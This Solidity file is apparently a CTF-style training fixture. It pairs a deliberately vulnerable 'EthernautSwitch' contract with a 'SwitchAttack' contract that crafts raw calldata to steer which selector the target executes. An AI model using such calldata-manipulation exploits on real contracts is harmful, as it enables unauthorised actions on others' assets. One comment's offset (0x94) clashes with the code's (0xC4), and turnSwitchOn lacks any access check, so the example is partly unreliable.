// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautSwitch {
    bool public switchOn;
    bytes4 public lastSelector;

    function flipSwitch(bytes memory _data) public {
        uint256 off;
        assembly {
            off := calldataload(68)
        }
        bytes4 selector;
        assembly {
            selector := calldataload(off)
        }
        lastSelector = selector;
        if (selector == bytes4(keccak256("turnSwitchOn()"))) {
            this.turnSwitchOn();
        }
    }
    function turnSwitchOn() public {
        switchOn = true;
    }
}

contract SwitchAttack {
    function attack(EthernautSwitch target) external {
        // flipSwitch reads calldataload(68) as an offset, then reads the
        // selector at that absolute offset. Build a raw payload where byte
        // 68 = 0x94 and the turnSwitchOn() selector sits at absolute 0x94.
        // (ABI-valid shape for flipSwitch(bytes): selector + offset + len +
        // padded data.)
        bytes memory payload = abi.encodePacked(
            bytes4(0x30c13ade),          // flipSwitch(bytes)      [0-3]
            bytes32(uint256(0x20)),      // ABI offset             [4-35]
            bytes32(uint256(0x60)),      // data length            [36-67]
            bytes32(uint256(0xC4)),      // byte 68: offset -> 196 [68-99]
            bytes32(uint256(0)),         // padding               [100-131]
            bytes32(uint256(0)),         // padding               [132-163]
            bytes32(uint256(0)),         // padding               [164-195]
            bytes4(0x76227e12)           // turnSwitchOn() @196    [196-199]
        );
        (bool ok,) = address(target).call(payload);
        require(ok, "flip failed");
    }
}

// Local training fixture: flipSwitch reads the target selector from an
// attacker-controlled offset in calldata, so a crafted payload can make it
// execute turnSwitchOn().

